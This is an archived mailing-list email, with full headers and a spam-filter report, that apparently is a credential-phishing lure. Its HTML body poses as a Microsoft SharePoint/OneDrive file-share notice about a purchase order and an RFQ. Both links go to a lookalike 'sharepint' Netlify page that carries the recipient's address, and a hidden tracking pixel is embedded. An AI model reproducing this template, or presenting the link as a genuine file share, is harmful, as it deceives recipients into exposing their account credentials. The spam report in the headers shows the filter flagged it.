Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id AFD844E5D45
	for <lists+industrypack-devel@lfdr.de>; Thu, 24 Mar 2022 03:41:41 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1nXDI0-0006Wo-I4
	for lists+industrypack-devel@lfdr.de; Thu, 24 Mar 2022 02:41:40 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <server@securyit.me>) id 1nXDHz-0006Wh-5c
 for industrypack-devel@lists.sourceforge.net; Thu, 24 Mar 2022 02:41:38 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=K2ByBG7BHCH9BxxZxsFciny32Bql+c7Bm08daoaqV2M=; b=JjDflgU8Ll9H1JdoU8XVZWxa9L
 Y0sW/N/UF4/YmA9d+sKSqbUNpPZyCeArYNvgYjU4SPHQi9YPKbWVPnLfLfQmu2P9yc2gbyJQc+Xt1
 bCg9Mc082R5xK5IvJX220RlNVK/Gt9hXWHq6qjWhmUJqF77FrSaqItXHD2KGkBPSPsN4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=K2ByBG7BHCH9BxxZxsFciny32Bql+c7Bm08daoaqV2M=; b=l
 QoOrFn7QGCeplCPKYACfP1E3MnoM1LvOyJC9Je9aNEZobvF6o1mTiaUrcihhVy+kl9CsHPhkX/J0K
 c0bjErJGQNfPLgihDeseyQ4ywXrpdHhEWkW+M+5b1Y92TL9LIuonY30SWJG0kIFRW2fuWuHatqkXr
 kuED0KaPiQOKsdwc=;
Received: from [198.46.189.121] (helo=mail0.securyit.me)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1nXDPt-009y6J-TZ
 for industrypack-devel@lists.sourceforge.net; Thu, 24 Mar 2022 02:41:38 +0000
From: Microsoft  <no-reply@outlook.com>
To: industrypack-devel@lists.sourceforge.net
Date: 23 Mar 2022 19:41:31 -0700
Message-ID: <20220323194130.324858E12E7E0FCD@outlook.com>
MIME-Version: 1.0
X-Spam-Score: 7.1 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: From: TOPAZ GROUP To:
 industrypack-devel@lists.sourceforge.net Files : 
 Content analysis details:   (7.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [198.46.189.121 listed in dnsbl-1.uceprotect.net]
 0.4 RCVD_IN_MSPIKE_L4      RBL: Bad reputation (-4)
 [198.46.189.121 listed in bl.mailspike.net]
 1.0 RCVD_IN_XBL            RBL: Received via a relay in Spamhaus XBL
 [198.46.189.121 listed in zen.spamhaus.org]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
 provider [no-reply[at]outlook.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
 mail domains are different
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_IMAGE_RATIO_06    BODY: HTML has a low ratio of text to image
 area
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.2 FREEMAIL_FORGED_FROMDOMAIN 2nd level domains in From and
 EnvelopeFrom freemail headers are different
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.0 RCVD_IN_MSPIKE_BL      Mailspike blacklisted
 1.7 TO_NO_BRKTS_HTML_IMG   To: lacks brackets and HTML and one image
 0.0 TO_IN_SUBJ             To address is in Subject
X-Headers-End: 1nXDPt-009y6J-TZ
Subject: [Industrypack-devel] Files were sent to
 industrypack-devel@lists.sourceforge.net via Microsoft sharepoint OneDrive
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1915509592447386749=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============1915509592447386749==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_03532FAE.A2825598"


------=_NextPart_000_0012_03532FAE.A2825598
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Verdana=
, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
T-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: norm=
al; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGR=
OUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial"><BR class=3DApple-interchange-newl=
ine><BR style=3D"BOX-SIZING: border-box"></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Verdana=
, Arial, Helvetica, sans-serif; WIDTH: 656px; WHITE-SPACE: normal; WORD-SPA=
CING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); PA=
DDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: norm=
al; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0p=
x; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial">
<table style=3D"BOX-SIZING: border-box; WIDTH: 656px; BACKGROUND: rgb(255,2=
55,255); BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" cellspacing=3D"0" cellp=
adding=3D"8" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box" valign=3D"top">
<table style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(220,234,245) 1px so=
lid; BORDER-RIGHT: rgb(220,234,245) 1px solid; BORDER-COLLAPSE: collapse; B=
ORDER-BOTTOM: rgb(220,234,245) 1px solid; BORDER-LEFT: rgb(220,234,245) 1px=
 solid; border-radius: 4px" cellspacing=3D"0" cellpadding=3D"0" align=3D"ce=
nter" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box" height=3D"6" colspan=3D"3"><BR style=
=3D"BOX-SIZING: border-box"></TD></TR>
<TR style=3D"BOX-SIZING: border-box; LINE-HEIGHT: 0px">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px" height=3D"1" width=3D"=
100%" align=3D"center"><img style=3D"HEIGHT: 88px; WIDTH: 371px" src=3D"cid=
:logo-sharepoint.png" width=3D"366" height=3D"140"><BR style=3D"BOX-SIZING:=
 border-box"></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box">
<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse; LINE-HEI=
GHT: 25px" cellspacing=3D"0" cellpadding=3D"0" align=3D"center" border=3D"0=
">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box" height=3D"30" colspan=3D"3"><BR style=
=3D"BOX-SIZING: border-box"></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box" width=3D"36"><BR style=3D"BOX-SIZING: =
border-box"></TD>
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; BORDER-COLLAPSE: coll=
apse; COLOR: rgb(68,68,68)" valign=3D"top" width=3D"454" align=3D"left">
<DIV style=3D"BOX-SIZING: border-box">From: &nbsp;<STRONG>TOPAZ GROUP</STRO=
NG><BR><BR>To: industrypack-devel@lists.sourceforge.net<BR style=3D"BOX-SIZ=
ING: border-box"></DIV>
<DIV style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">=
</DIV>
<DIV style=3D"BOX-SIZING: border-box"><U>Files</U> :&nbsp;<BR><BR>"<A href=
=3D"https://sharepint-youthful-mcclintock-886a65.netlify.app/#industrypack-=
devel@lists.sourceforge.net">Purchase_Order.xls,Products_Brochure.docx,RFQ =
N&ordm; 100400806-02.pdf</A>"<BR><BR style=3D"BOX-SIZING: border-box"></DIV=
>
<DIV style=3D"BOX-SIZING: border-box"><A style=3D"BOX-SIZING: border-box; T=
EXT-DECORATION: none; COLOR: rgb(0,172,255); BACKGROUND-COLOR: transparent"=
 href=3D"https://sharepint-youthful-mcclintock-886a65.netlify.app/#industry=
pack-devel@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank>Click he=
re to view Files</A><BR style=3D"BOX-SIZING: border-box"></DIV>
<DIV style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">=
</DIV>
<DIV style=3D"BOX-SIZING: border-box">(You received these files via Microso=
ft sharepoint OneDrive.)<BR style=3D"BOX-SIZING: border-box"></DIV></TD>
<td style=3D"BOX-SIZING: border-box" width=3D"36"><BR style=3D"BOX-SIZING: =
border-box"></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box" height=3D"36" colspan=3D"3"><BR style=
=3D"BOX-SIZING: border-box"></TD></TR></TBODY></TABLE></TD></TR></TBODY></T=
ABLE>
<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
ing=3D"0" cellpadding=3D"0" align=3D"center" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box" height=3D"10"><BR style=3D"BOX-SIZING:=
 border-box"></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
ing=3D"0" cellpadding=3D"0" align=3D"center" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; COLOR: rgb(168,185,19=
8)">
<td style=3D"BOX-SIZING: border-box" width=3D"400" align=3D"left"><BR style=
=3D"BOX-SIZING: border-box"></TD>
<td style=3D"BOX-SIZING: border-box" width=3D"128" align=3D"right">&copy; 2=
022 Microsoft <BR><BR style=3D"BOX-SIZING: border-box"></TD></TR></TBODY></=
TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Verdana=
, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
T-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: norm=
al; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGR=
OUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial"><img style=3D"BORDER-TOP-STYLE: no=
ne; BOX-SIZING: border-box; BORDER-LEFT-STYLE: none; VERTICAL-ALIGN: middle=
; BORDER-BOTTOM-STYLE: none; BORDER-RIGHT-STYLE: none" src=3D"cid:fw4wbhvhu=
m7nunocnesvzb" width=3D"1" height=3D"1"></DIV></BODY></HTML>
------=_NextPart_000_0012_03532FAE.A2825598
Content-Type: image/png; name="logo-sharepoint.png"
Content-Transfer-Encoding: base64
Content-ID: <logo-sharepoint.png>

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
